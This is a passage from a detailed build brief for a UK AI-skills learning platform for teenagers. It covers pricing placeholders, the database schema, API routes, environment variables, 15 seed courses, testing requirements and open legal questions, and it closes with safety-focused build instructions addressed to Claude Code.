| Tooling | pnpm, ESLint, Prettier, Husky + lint-staged, GitHub Actions |

**Third-party services assumed** (each still needs Chris's go-ahead on account creation or a paid tier): Vercel, Postgres provider, Stripe, AI Gateway plus at least one text model provider for Coach and for course drafting, Inngest, email, object storage, Sentry. Radar source APIs (Product Hunt, a GitHub token, and any paid search or fetch API) are **not** assumed: ask first, and ship with official free APIs and public RSS that their terms allow. **Anything else: ask first.** Error monitoring, if approved, must use an EU region with PII scrubbing and no session replay on learner routes.

---

## 11. Monetisation

All prices are **placeholders**. Store plans in the database and Stripe, not in code.

| Plan | Price (placeholder) | Includes |
|---|---|---|
| **Free** | £0 | Up to 2 learners; 4 free courses (Homework Helper Chatbot, Shoot a Promo Advert in an Afternoon, Prompt Gym, Spot the Deepfake); Coach 50 credits/learner/month; portfolio; certificates for free courses; full parent controls |
| **Family** | £14.99/month or £119/year (founding: £9.99/month or £89/year locked for 12 months) | Up to 4 learners; full catalogue; Coach 200 credits/learner/month; all parent controls |
| Extra seat | £3/month | Beyond 4 |
| Promo codes | Set in admin | Percentage or fixed off, free period, credit grant, or plan unlock; expiry and caps |

Monthly plans are cancellable at any time via the Stripe Customer Portal. An 18-year-old can subscribe themselves to Family (one seat). Under-18s never see payment interfaces. Webhooks are the source of truth for entitlements and must be signature-verified and idempotent.

---

## 12. Data model

Postgres, Drizzle schema in `src/server/db/schema/*.ts`. Conventions: `id uuid pk default gen_random_uuid()`, `created_at`/`updated_at timestamptz`, enums as Postgres enums, money in pence (`integer`), times stored UTC and displayed Europe/London. Every table holding learner data is indexed on `user_id` or `learner_id` and covered by `authz` tests.

**Extensibility:** design these tables so future additions can be added later without a rewrite — keep `user.kind` and `feature_flag` rules open, and avoid a closed set of consent keys or notification types. **Do not create tables, routes or screens for future additions now** (no schools, no gamification, no gallery, no playground). The AI course creation engine **is** launch scope: do create its tables, routes, jobs and screens.

**Identity and consent:** `user` (kind `learner`/`parent`/`staff`, email nullable, username nullable unique citext, status); Better Auth tables including 2FA; `staff_role`; `learner_profile` (birth month and year, safety_band, pathway, avatar_seed, interests, a11y jsonb); `family` (stripe customer, age_assurance_level, plan); `family_member`; `parent_link_request`; `invite_code`; `consent_definition` and append-only `consent_record`; `parent_control`; `usage_day`.

**Content:** `course` (including `origin` of `hand_made` / `ai_radar` / `ai_on_demand`, and optional source candidate, idea and generation-job IDs), immutable `course_version` once published (drafts and edit-request regenerations also create versions), `module`, `lesson`, `step` (with `disabled` for urgent take-down), `asset`, `quiz`, `quiz_question`, `rubric_criterion`, `course_tool`, `tool_guide`, `tool_guide_step`, `tool_approval`, `tag`.

**Tools, Radar and course generation:** `tool` (all Register fields including `under18_policy` and `last_checked_at`); `tool_substitute`; `tool_change_event` (detected change, page URL, old/new hash, diff summary, impact, status); `radar_source` (adapter, config, schedule, enabled, last run); `radar_item` (source, external id, url, title, text, raw JSON, content hash); `radar_candidate` (name, vendor domain, facts, evidence, score and breakdown, status, mentions, linked tool); `radar_mention`; `course_idea` (stable idea ID, title, summary, category, difficulty, min age, flags, status); `generation_job` (kind `radar_auto` or `on_demand`, trigger and input, status, cost, model, resulting version, error, created by); `edit_request` (instructions, scope, source version, resulting version, status); `preview_token` (hashed token, course version, expiry, created by, revoked at); `review_task`; `review_decision`; `review_comment`; `publish_schedule`; `prompt_template` (including drafting and Radar extraction prompts).

**Learning:** `enrolment` (pinned `course_version_id`); `step_progress`; `quiz_attempt`; `reflection`; `project` (visibility private at launch); `project_version`; `artefact`; `certificate`; `wishlist`; `unlock_request`.

**AI and credits:** `model_route`; `credit_price`; `ai_request` (metadata); `ai_message` (encrypted, retention-swept); `tutor_conversation`; append-only `credit_ledger`; `credit_balance`; `spend_counter`; `rate_limit_bucket`.

**Safety:** `moderation_event`; `moderation_item`; `report`; `safeguarding_case` (DSL-only access); `safeguarding_access_log`; `enforcement_action`; append-only `audit_log`; `data_request`; `retention_policy`; `support_ticket`.

**Billing and CMS:** `plan`; `subscription`; `stripe_event` (idempotency); `promo_code`; `promo_redemption`; `notification`; `feature_flag`; `page` and `page_version`; `email_template`; `site_setting` (never stores secrets); optional `staff_permission`.

---

## 13. API routes and repository structure

**Conventions.** Mutations from the app use Server Actions in `src/app/**/actions.ts`, each calling a service in `src/server/services/*`. Route Handlers (`/api/*`) for streaming Coach, webhooks, jobs, uploads and public verify. JSON in/out, Zod-validated, errors as `{ error: { code, message } }` with a teen-friendly `message`. Version the public API under `/api/v1/` so a native app could use the same backend later, but do not build native apps now. Every handler: `requireSession()` → `authz.can(user, action, resource)` → rate limit → service.

Provide routes for auth and family (including teen-first approval, consents, controls and pause), age-filtered catalogue and enrolment, autosave, evidence, tool approvals, quizzes, submit, wishlist, unlock requests, and a usage heartbeat. Coach: `POST /api/v1/ai/chat`, estimate and credits. Portfolio: projects, signed uploads (complete triggers moderation), artefact download, certificate PDF, and `GET /api/public/verify/:code`. Safety and billing: reports, notices, data-requests, Stripe checkout/portal/setup-intent (parent or adult only) and a signature-verified webhook. Studio (staff + 2FA): courses and versions, take-down, review (approve, request edits, decline), tools and guides, assets, moderation, safeguarding (break-glass reason header), users, AI controls, audit, pages, emails, plans, promos, settings, flags and staff invite; plus Radar candidates (list, dismiss, watch, trigger draft), tool-change triage, course ideas (list, create, edit, dismiss), on-demand generation, edit requests, and staff preview-link issue/revoke. Jobs: Inngest (or cron with `CRON_SECRET`) and `GET /api/health` (no secrets). Never expose hidden `coachContext` or solutions in a way that bypasses the server. Draft preview routes must reject learners and signed-out users. Do not add teacher, playground, gamification or gallery routes now.

**Repository (suggested):**

```
/
├─ README.md  PLATFORM_SPEC.md  .env.example
├─ docs/        CHANGELOG, OPEN_QUESTIONS, DEPENDENCIES, ARCHITECTURE, compliance/, runbooks/
├─ content/     courses/*.json  tools/*.json  course-ideas.json  consents/  prompts/  help/
├─ evals/coach/*.yaml
├─ src/app/     (marketing) (auth) (learner) (parent) (studio) api/
├─ src/content/schema.ts
├─ src/server/  db/ auth/ authz/ ai/ (proxy + draft) radar/ services/ jobs/ email/ storage/ stripe/ audit/ flags/
├─ src/lib/     dates (Europe/London), formatting, BRAND_NAME
├─ scripts/     seed, import-courses, check-content, eval-coach
└─ tests/       unit/ integration/ e2e/ a11y/ fixtures/
```

Organise UI components as you like (for example `ui/`, `course/`, `guides/`, `submissions/`, `coach/`, `parent/`, `studio/`).

---

## 14. Environment variables

All in `.env.example` with comments. Server-only unless prefixed `NEXT_PUBLIC_`. Validate at boot with a Zod `env.ts`.

`NEXT_PUBLIC_BRAND_NAME`, `NEXT_PUBLIC_APP_URL`, `NODE_ENV` / `APP_ENV`, `DATABASE_URL`, `DATABASE_URL_UNPOOLED`, `BETTER_AUTH_SECRET`, `BETTER_AUTH_URL`, `STAFF_2FA_REQUIRED`, `AGE_ASSURANCE_MODE`, `AI_GATEWAY_API_KEY`, `MODERATION_PROVIDER` / `MODERATION_API_KEY`, `AI_DAILY_SPEND_CAP_GBP`, `AI_FEATURE_CAPS_JSON`, `CREDIT_VALUE_PENCE`, `FREE_MONTHLY_CREDITS`, `FAMILY_MONTHLY_CREDITS`, `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`, `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY`, `STRIPE_PRICE_FAMILY_MONTHLY` / `_ANNUAL` / founding equivalents, `STORAGE_*` (provider, buckets, credentials), `SUPABASE_*` if chosen, `EMAIL_*`, `INNGEST_*`, `CRON_SECRET`, `SAFEGUARDING_ENCRYPTION_KEY`, `CONTENT_ENCRYPTION_KEY`, `DSL_ALERT_EMAILS`, `DEPUTY_DSL_ALERT_EMAILS`, `SENTRY_DSN`, optional PostHog and Turnstile keys if approved, `SEED_PASSWORD` (dev only), `OWNER_BOOTSTRAP_EMAIL`, `TZ_DISPLAY=Europe/London`. Radar and drafting (defaults; live values are also admin-configurable where noted): `RADAR_ENABLED` (default off until sources are configured), `RADAR_AUTODRAFT_THRESHOLD` (default 70), `RADAR_MAX_COST_PER_DRAFT_GBP`, `RADAR_MONTHLY_BUDGET_GBP`, `RADAR_USER_AGENT` (for example `[Platform Name]-Radar/1.0 (+https://…/radar)`), `PRODUCTHUNT_API_TOKEN` (only if approved), `GITHUB_TOKEN` (read-only, no repository scopes, only if approved), and any other search or fetch API keys Chris has approved. Never commit secrets. None of the `NEXT_PUBLIC_` variables may be secret.

---

## 15. Seed data

`pnpm db:seed` must create a fully explorable local environment.

**24 categories:** `apps-websites`, `games`, `chatbots-agents`, `automations`, `data-analysis`, `prompt-engineering`, `image-design`, `video-film`, `music-audio`, `writing-storytelling`, `marketing-social`, `entrepreneurship`, `research-study`, `maths-science`, `coding-ml`, `robotics-iot`, `ar-vr-3d`, `cybersecurity`, `ethics-safety`, `careers`, `productivity`, `accessibility`, `environment`, `fun-hobbies`.

**16 interest tags:** music, film, games, apps, coding, art, fashion, sport, business, study, writing, science, social, design, environment, careers.

**Starter courses (15).** Author all 15 as complete JSON that passes validation (3–5 modules, at least one ethics checkpoint, quiz, rubric, project brief, Tools you'll need, and a complete setup guide for every required tool). Section 6.1 fully specifies the Snapchat-style app; Section 6.2 outlines two more; author the rest to the same standard.

| Course | Category | Level | Min age | Free | Core tools | What they submit |
|---|---|---|---|---|---|---|
| Build Your Own Snapchat-Style App | apps-websites | Builder | 13 | No | Replit (fallback Base44) | private project link + screenshots of the filter on a provided sample image, cartoon avatar or object, and of the chat (no photos of real people) |
| Homework Helper Chatbot (The Honest Kind) | chatbots-agents | Starter | 13 | Yes | A named 13+ text tool | bot link and/or screenshots + honesty note |
| Make Your Own AI Music Video | video-film | Builder | 13 | No | Canva + CapCut (18+ generators only if parent_operated) | unlisted or view link, or a video file that does not contain real people, plus an end-card screenshot (no real people) |
| Shoot a Promo Advert in an Afternoon | video-film | Starter | 13 | Yes | Canva + CapCut | unlisted or view link, or a 30 s video file that does not contain real people |
| Prompt Gym: From Vague to Laser-Sharp | prompt-engineering | Starter | 13 | Yes | A named 13+ text tool | prompt library + before/after screenshots |
| Design Your Dream Streetwear Drop | image-design | Starter | 13 | No | Canva (or a named image tool) | logo, mock-ups, lookbook |
| Make a Track with an AI Bandmate | music-audio | Starter | 13 | No | A named music tool (free tier) | audio file or private share link |
| Teach a Computer to See (Kind Of) | coding-ml | Starter | 13 | No | Teachable Machine or equivalent | project link + short report |
| Spot the Deepfake | cybersecurity | Starter | 13 | Yes | Curated media set on the platform | checklist + quiz results |
| Launch a Brand in 48 Hours (On Paper) | marketing-social | Starter | 13 | No | Canva + a named text tool | document + image set |
| The Citation Machine (You Still Have to Think) | research-study | Starter | 13 | No | A named text tool | document (never invent citations) |
| Validate a Side-Hustle Idea in a Week | entrepreneurship | Starter | 13 | No | A named text tool | go/no-go memo |
| Portfolio and CV Studio | productivity | Builder | 15 | No | Replit or Canva | site link and/or PDF CV |
| Second Brain, First Time | productivity | Starter | 13 | No | A named 13+ notes tool | document or private share link |
| Football or F1 Stats Detective | data-analysis | Starter | 13 | No | Replit or Colab if policy allows | notebook/dashboard link + data story |

Bake the obvious safety constraints into each course (no real messaging or API keys, exam integrity, no real-person likeness, rights-cleared audio, no copied brand logos, no generating fakes of real people, no personal contact details in public exports, and no evidence that requires images or video of real people until a CSAM screening provider is approved and enabled).

Also seed: Tool Register entries for `replit`, `base44`, `canva`, `capcut`, `chatgpt`, plus around 10 further `candidate` tools marked "to verify". Do not seed a `platform-text-ai` or other in-platform playground tool — the playground is a future addition, and Coach is not a Tool Register tool. Seed the course ideas backlog from `content/course-ideas.json` (copy the supplied `COURSE_IDEAS.json`, 175 ideas); Radar source records (enabled in development against fixtures, disabled or carefully rate-limited otherwise); one sample `ai_draft` course in the review queue, with evidence, a `[VERIFY]` flag and a preview link, so the approve / edit / request-edits / decline path can be tried locally; drafting prompt templates and a drafting model route; dev users only (owner, a few staff roles, two families — never in production); some mid-course progress, one open moderation item and one clearly labelled TEST safeguarding case; plans, consent definitions, prompt templates, credit prices, model routes, retention policies, and about 10 help articles (getting started, safety, external tools and age rules, parent approvals, consent, deleting data, cancelling, what my parent sees, reporting, AI honesty, accessibility).

---

## 16. Testing

Cover, at least: TypeScript strict and ESLint (including `jsx-a11y`); unit tests for authz, under-18 policy, tool-approval gates, credits, safetyBand, validators, PII redaction and retention; `pnpm content:check` in CI; integration tests against real Postgres, Stripe webhook fixtures and jobs; Coach proxy stages with mocked providers; concurrency tests so parallel AI requests never overspend and submits/webhooks are idempotent; Playwright journeys for parent and teen sign-up, a first course, the under-13 block, age gating via direct URL, parent tool-approval, submission moderation (auto-accept of a clean fixture when the setting is on; a flagged fixture goes to the human queue), the time cap, take-down, "teen never sees prices", and data deletion (include a Chromebook-like viewport); axe-core on every route plus keyboard-only scripts for the player, Coach, guides and submit; an authz matrix and SSRF checks on submitted links **and on Radar/enrichment fetchers** (block private-network addresses); Coach evals from Section 8 using fixtures only; and Lighthouse CI on key pages (LCP < 2.5 s, INP < 200 ms, CLS < 0.1). Also cover the course creation engine, with sources and model providers mocked: fetch, dedupe and score; a high-scoring candidate produces a full draft that validates against the Section 6 schema (and a failing draft is flagged, never published); validation rejects a draft whose evidence brief requires images or video of real people while screening is not enabled; on-demand generation from a subject, a tool name and a course idea ID; request-edits regenerates the chosen scope and keeps version history (including restore); the second-reviewer setting is enforced when on and allows a sole owner approval when off; the publish service always refuses a version with no human approval; preview links and draft slugs are denied to learners and signed-out users; an admin can open the real course player in preview and complete a quiz and a (fixture) submission without issuing a certificate or writing learner analytics; tool-change watching flags affected guides and courses. No test hits real AI providers, paid Radar APIs or Stripe live mode in CI. Every bug fix adds a regression test.

---

## 17. Open questions and decisions for Chris (⚖️ = legal or specialist input)

1. Final brand name and domain (replace `[Platform Name]`).
2. Database host: Neon or Supabase (both London).
3. Approve paid services: Vercel, AI gateway and a text model for Coach, Inngest, email, storage, video hosting, Sentry, analytics, bot protection.
4. For every seed external tool, confirm current terms: minimum age, parental consent, and whether a parent-operated account is allowed if the tool is 18+. ⚖️ Record the decision in the Tool Register before publishing a course that uses it.
5. Age assurance method for 13–15. ⚖️
6. Lawful bases, DPIA sign-off, retention periods, safeguarding record retention. ⚖️
7. Appointing a named DSL and deputy, or an outsourced moderation and safeguarding arrangement, before scaling beyond a sole operator; and approving crisis scripts. At launch Chris is sole staff, so the product must be operable that way, but a named cover arrangement is needed before volume grows. ⚖️
8. Online Safety Act scope for the launch service. ⚖️
9. Confirm parent visibility of tutor transcripts stays as a summary only.
10. Pricing, Coach allowances and the founding-family offer, once real Coach costs can be measured.
11. CSAM hash-matching provider before enabling uploads of images or video of people. ⚖️
12. Confirm the 18-year-old self-serve route is on from the start (turn off with a flag only if you decide otherwise).
13. Who records explainer videos and captions?
14. Approve any paid or token-gated Radar sources (Product Hunt, GitHub, others) before they are enabled in production.
15. Confirm the launch default that Chris can approve an AI-drafted course alone, with the second-reviewer setting ready to turn on later.
16. Coach and course-drafting data residency: children's and learners' text (and staff drafting prompts) goes to a model provider. Confirm UK or EU processing, or adequate transfer safeguards, and a DPA, before launch. Keep the redaction already specified. ⚖️

---

## 18. Glossary

- **Artefact:** the finished thing a learner makes (app, video, track, bot, document).
- **Credits / AI energy:** platform-internal units for **Coach only**, not for third-party tool bills.
- **DSL:** Designated Safeguarding Lead.
- **Proxy:** our server-side layer between learners and the model providers used by Coach.
- **safetyBand / pathway:** age-based safety policy group / school-stage content grouping.
- **Setup guide:** step-by-step instructions for creating an account on an external tool and doing the project work there, with a last-verified date.
- **Tool Register:** the database of external tools learners use to build projects, including age rules, cost, under-18 policy and last-checked date. Coach and drafting model providers are internal processors, not Tool Register tools.
- **under18Policy:** `allowed`, `parent_consent_required`, `parent_operated`, or `blocked`.
- **AI course creation engine:** the launch system that discovers tools (Tool Radar), generates full draft courses automatically or on demand, and puts them in a human review queue. It never publishes by itself.
- **Course ideas backlog:** the list of course ideas (seeded from `content/course-ideas.json`, 175 ideas) from which Chris can generate a draft on demand.
- **Preview mode:** the real learner course page and player, showing a hidden draft, for staff to view, inline-edit and test before publish.
- **Radar / Tool Radar:** the scheduled discovery half of the engine: sources, candidates, scores, evidence and auto-drafts, plus tool-change watching.
- **⚖️:** needs legal or specialist confirmation.

---

## 19. Future additions (not to build now)

These are part of the longer-term product idea. **Do not build them now.** Design the data model and API so they can be added later without a rewrite, but do not add their tables, routes, jobs or screens in this build.

- **Optional beginner playground** — a simple, parent-capped in-platform text chatbot for practising prompts (no image, video or music generation).
- **Gamification** — XP, levels, weekly streaks, badges and a per-learner or per-family off switch; no loot boxes, paid advantages, or streak-loss notifications to 13–15s.
- **Teacher and school features** — teacher accounts, classes, rosters, assignments, class analytics, rubric marking, school admin, a school DSL view, curriculum mapping, lesson plans, and school licences with invoice billing.
- **Classroom connectors** — presentation mode, MAT and local-authority licences, and connections to LTI, Google Classroom, Microsoft Teams and MIS/Wonde.
- **Community and sharing** — a moderated project gallery, remix with credit, parent-approved sharing, clubs, challenges, opt-in friend or class leaderboards only, workshops and mentorship. No public global leaderboard of children.
- **Native iOS and Android apps** talking to the same API, including push notifications.
- **Careers tools** — skills transcript, CV and portfolio export for 16+, careers explorer, digital badges, a UCAS helper that never ghost-writes, and a vetted opportunities board.
- **Welsh localisation** and **British Sign Language** video support.
- **Offline downloads** of course materials, and any in-app support needed for **physical kits**.
- **Advanced analytics** beyond the basic admin snapshot, plus a richer recommender.
- **Learning extras** — skill-assessment onboarding, weekly goals, a prompt journal, a course glossary, a text-first track, and a GitHub export guide for older learners (the platform does not host that pipeline).
- **Parent extras** — weekly progress reports, and parent approval for any future sharing features.
- **Sign-in extras** — Google, Microsoft or Apple sign-in for parents, passkeys, and a parent PIN.
- **Commercial extras** — a distinct individual 18+ plan, gift plans, bursaries, and school licence billing.
- **Trust extras** — a public trust centre and status page, and an independent safety review process.
- **Read-aloud** and a **focus mode** that reduces distraction during a step.

---

## 20. Instructions to Claude Code — now build it

You are building the **launch** [Platform Name] platform described in this brief. Read the whole document, then build it.

1. **Visual design, layout and UI are entirely your call; propose a design direction before building screens.** This brief does not specify colours, typefaces, themes, component libraries, page layouts or any visual look. Choose an accessible, Chromebook-friendly approach, explain the direction, then implement it consistently. Do not wait for a design to be supplied.
2. **Build only the launch product** specified in the main body of this brief, **including the AI course creation engine** (Section 3.9 and Section 6.3): automatic discovery, on-demand generation, the review queue, front-end preview and inline editing, and tool-change watching. Section 19 lists future additions: design the data model so they can be added later, but do not build them now. There are no timescales, phases or milestones.
3. **Ask before adding any paid service, new third-party processor of children's data, or new AI provider.** Section 10 lists services already assumed; anything else needs Chris's explicit approval. Free and open-source libraries are fine without asking, but record them in `docs/DEPENDENCIES.md` with their licence.
4. **Secrets live only in environment variables** (Section 14). Never commit keys, never log them, never send them to the browser. Only variables prefixed `NEXT_PUBLIC_` may reach the client, and none of those may be secret. Provide `.env.example` with every variable and a comment.
5. **Write tests as you go** (Section 16). Safety-sensitive behaviour (age gates, tool approvals, Coach proxy, submissions, parent controls) needs both unit and end-to-end coverage.
6. **Safety beats speed.** If a requirement is ambiguous and one reading is safer for children, implement the safer reading and note the question in `docs/OPEN_QUESTIONS.md`.
7. **External tools, with guides.** Learners build projects in real external tools, following step-by-step setup and how-to guides. The platform must never ask for those tools' passwords, one-time codes or API keys, and must never include an in-platform sandbox, code editor, app preview or per-tool build proxy. **Coach** always goes through the server-side AI proxy (Section 8). **Course drafting** also goes through the server (Section 6.3), is staff-only, and must **never auto-publish**. No client code may call a model provider directly. 18+ tools are blocked or parent-operated only, as the Tool Register says; parent approval is required where the policy says so.
8. **Private by default.** No launch feature may let one learner see another learner's content, profile or messages.
9. **Use British English** in all user-facing copy ("colour", "personalise", "organise", "programme" for schemes, "maths", "Year 9", "sixth form", "GCSE"). Dates as `15 November 2026`, times in Europe/London, currency in GBP (£).
10. **Accessibility is required from the start.** Build every component to WCAG 2.2 AA (Section 9).
11. **Don't invent legal conclusions.** Where this brief says "confirm with legal/DPO", leave a TODO and a config flag rather than hard-coding an assumption.
12. Prefer boring, well-documented choices. Keep the codebase a single Next.js app (no microservices) unless a genuine technical need appears and you have asked first.
13. Content (courses, pages, copy, emails, plans, flags, tools) is data, not code. The owner must be able to manage it from the admin dashboard with no code change. Courses are authored as JSON/DB records validated by Zod schemas (Section 6), never hard-coded pages.
14. Work in sensible vertical slices. After each slice, run the tests, update `docs/CHANGELOG.md`, and stop for review when a paid service or legal decision is required.
15. Seed the 15 starter courses (Section 15). One is fully specified in Section 6.1; two are outlined in Section 6.2; author the others to the same standard, including setup guides for every required tool. Also seed the course ideas backlog from `content/course-ideas.json` (the supplied 175 ideas) and one sample AI draft in the review queue.
16. **AI drafts are reviewed in the real front end.** Preview and inline editing use the actual learner course page and course player, hidden from the public. At launch the owner can approve an AI draft alone; implement the second-reviewer setting so it can be turned on later. Always require at least one human approval record before publish.

Build the launch platform described in this brief.

---

*End of brief. When in doubt: safer for children, clearer for parents, more fun for teens, and manageable by the owner without changing code.*
